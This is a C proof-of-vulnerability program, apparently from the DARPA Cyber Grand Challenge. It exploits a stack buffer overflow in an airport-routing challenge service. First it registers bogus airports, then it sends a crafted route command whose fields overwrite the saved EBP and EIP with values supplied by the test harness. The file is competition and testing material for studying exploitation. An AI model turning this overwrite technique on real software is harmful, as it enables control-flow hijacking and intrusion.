/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libcgc.h>


#define MAX_ENTRIES 10
#define NEEDED_ENTRIES (MAX_ENTRIES+2)

int write( int fd, void *buffer, size_t count )
{
	size_t written;
    int total_written;
    int retval;

    written = 0;
    total_written = 0;

    while (total_written < count) {
	   retval=transmit(fd, buffer+total_written, count-total_written, &written);

       if (retval != 0)
            return(-1);

       total_written+=written;
    }

	return(count);
}


int receive_bytes (int fd, void *buffer, size_t count) 
{
size_t total;
size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }
    }

	return 0;
}


size_t readline( char *buffer, size_t limit )
{
    size_t len = 0;
    size_t rx = 0;
    char c = 0;

    while( len < limit ) {
        buffer[len] = 0;

        if ( receive( STDIN, &c, 1, &rx ) != 0 ) {
            len = 0;
            goto end;
        }

		if (rx == 0) {
			len = 0;
			goto end;
		}

        if ( c == '\n' ) {
            goto end;
        }

        buffer[len] = c;
        len++;
    }
end:

	buffer[len] = 0;

    return len;
}


int eat_lines(int count)
{
char buffer[1024];
int i;


	for (i=0; i < count; ++i) {

		readline(buffer, sizeof(buffer));

	}

	return 0;

}

size_t strlen( const char *str )
{
	size_t len = 0;
	while ( *str++ != '\0' )
		len++;

	return len;
}


void int_to_str(unsigned int value, char *buffer) 
{
char temp[12];
int i;

	i = 0;

	while(value > 0) {

		temp[i++] = (value % 10) + '0';

		value = value / 10;

	}
	
	temp[i] = 0;

	for (i=0; i < strlen(temp); ++i) 
		buffer[i] = temp[strlen(temp)-i-1];

	buffer[i] = 0;


}

char *strcpy( char *pDest, const char *pSrc )
{
	char *pDestReturn = pDest;

	while ( *pSrc != '\0' )
		*pDest++ = *pSrc++;

	*pDest = '\0'; 

	return (pDestReturn);
}




int main(void)
{

char buffer[1000];
char newEBP[4];
char newEIP[12];  // EIP will be an ascii decimal
int i;
size_t size;
int retval;
unsigned int mask;

int pov_type;
int ip_mask;
int regmask;
int regnum;
unsigned int ipvalue;
unsigned int regvalue;

unsigned char exploit_buffer[24];

int value;

	pov_type = 1;
	ip_mask = 0xfefefefe;
	regmask = 0x007f7f7f;
	regnum = 5;


	if (write(3, &pov_type, sizeof(pov_type)) == -1)
		_terminate(-1);

	if (write(3, &ip_mask, sizeof(ip_mask)) == -1)
		_terminate(-1);

	if (write(3, &regmask, sizeof(regmask)) == -1)
		_terminate(-1);

	if (write(3, &regnum, sizeof(regnum)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &ipvalue, sizeof(ipvalue)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &regvalue, sizeof(regnum)) == -1)
		_terminate(-1);


	regvalue |= 0x00808080;
	ipvalue |= 0x01010101;
	
	// to exercise the vuln we need to use the single command line version of addAirport, but this requires that all connecting airports
	// already exist and be in the database, and we need 11 of them.  So first lets add 10 bogus airports that fill no need other than to 
	// make known airports in the database

	// add the new airports in the "interactive" mode so that they doesn't need a connecting airport to be specified

	buffer[0] = '2';
	buffer[1] = '\n';
	buffer[2] = '1';
	buffer[3] = 'B';
	buffer[5] = '\n';


	for (i=0; i < MAX_ENTRIES+1; ++i) {

		buffer[4] = i + 'A';

		write(1, buffer, 6);
		write(2, buffer, 6);
		eat_lines(1);
		write(1, "\n", 1);
		eat_lines(1);

	}


	// now add the 12th, but it does have a special purpose
	// its airport code will be used to overwrite EBP.  Since airport codes are only 3 bytes, only 24 bits of EBP can be controlled.

	newEBP[0] = regvalue & 0xff;
	newEBP[2] = (regvalue >> 16) & 0xff;
	newEBP[1] = (regvalue >> 8) & 0xff;
	newEBP[3] = '\n';

	write(1, "2\n", 2);
	write(1, newEBP, 4);
	eat_lines(1);

	write(1, "\n", 1);	


	int_to_str(ipvalue, newEIP);


	strcpy(buffer, "2/111/1BA/1/1/1BB/2/2/1BC/3/3/1BD/4/4/1BE/5/5/1BF/6/6/1BG/7/7/1BH/8/8/1BI/9/9/1BJ/10/10/1BK/14/14/");

	write(1, buffer, strlen(buffer));


	write(1, newEBP, 3);
	write(1, "/",1);
	write(1, newEIP, strlen(newEIP));
	write(1, "/0\n", 3);

	write(1, "13\n", 3);

}

